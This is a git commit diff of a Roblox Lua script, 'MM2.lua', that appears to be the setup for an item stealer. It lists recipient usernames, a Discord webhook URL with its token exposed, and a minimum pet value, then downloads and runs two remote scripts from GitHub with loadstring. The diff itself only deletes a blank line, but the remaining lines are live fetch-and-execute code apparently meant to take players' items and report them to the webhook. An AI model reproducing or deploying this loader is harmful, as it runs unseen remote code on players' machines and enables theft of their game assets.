027fe548492b7615500b2976110b9f6bb7c9a420
Anonimo221123 <misaelgarciaparedes2782009@gmail.com>
2025-08-22 17:35:39 -0500

    Update MM2.lua

--- MM2.lua
+++ MM2.lua
@@ -1,6 +1,5 @@
 Username = {"cybertu24","cybert242w","auto24we"} 
 Webhook = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY" 
 min_rap = 1 --for pets go and pet simulator 99 
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
 loadstring(game:HttpGet('https://raw.githubusercontent.com/Anonimo221123/TestJonGhost/refs/heads/main/MM2.lua'))()
